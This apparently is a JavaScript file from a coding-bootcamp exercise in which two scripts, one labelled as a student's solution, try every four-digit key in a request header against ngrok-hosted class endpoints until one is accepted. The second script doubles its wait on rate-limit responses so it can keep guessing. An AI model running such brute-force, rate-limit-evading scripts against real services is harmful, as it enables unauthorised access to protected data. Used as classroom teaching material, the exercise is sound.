import axios from "axios"

const endpoints = [
  "https://7758-2001-b07-a9a-89a8-fc69-90ae-c7c4-8dbc.ngrok-free.app/digitazon/2023/02/group/1/students",
  "https://b6a4-37-162-141-71.ngrok-free.app/digitazon/2023/02/group/2/students", // Codice 0876
  "https://878f-151-33-19-106.ngrok-free.app/digitazon/2023/02/group/3/students", // Codice 2023
  "https://5f00-212-24-20-117.eu.ngrok.io/digitazon/2023/02/group/4/students" // Codide 0020
]

async function tryAllCombinations() {
    for (let i = 0; i < 10000; i++) {
        const key = i.toString().padStart(4, "0")
        const headers = {
            key: key
        }
        try {
            const response = await axios.get(
                "https://b6a4-37-162-141-71.ngrok-free.app/digitazon/2023/02/group/2/students",
                { headers }
            )
            console.log("Key valida:", key)
            console.log("Risposta:", response.data)
            break
        } catch (error) {
            console.log("Key non valida:", key, error.response.status)
        }
    }
}
tryAllCombinations()


// SOLUZIONE DI ALBERTO
const axios = require('axios')

async function wait(ms) {
    // wrap setTimeout with a Promised so it could 
    // be awaited
    return new Promise(function(resolve) {
        console.log("wait")
        setTimeout(function() {
            console.log("finished waiting")
            resolve()
        }, ms)
    })
}

const DEFAULT_WAIT_TIME = 500
let WAIT_TIME = DEFAULT_WAIT_TIME

async function findId(url) {
    for (let i = 0; i < 10000; i++) {
        const key = i.toString().padStart(4, "0")
        await wait(WAIT_TIME)
        const res = await axios.get(url, {
            validateStatus: () => true, // puoi definire quali status sono definiti errore
            headers: { key }
        })
        if (res.status == 200) {
            console.log(`Key was found for ${url}: ${key}`)
            return
        }else if (res.status == 404) {
            console.log(`${url}: ${key} is not a valid key`)
            WAIT_TIME = DEFAULT_WAIT_TIME
        } else if (res.status == 429) {
            // timeout so we increase the waiting time
            WAIT_TIME = WAIT_TIME * 2
            console.log("Increasing wait time to", WAIT_TIME)
            i--
        } else { // CATCH ALL, no need try catch
            console.log(res)
            console.log("ERROR!", res.status, "HANDLE IT!", key)
            return
        }
    }  
}

const url = process.argv[2]
if (!url) {
    console.log("enter a url")
    return
}
findId(url)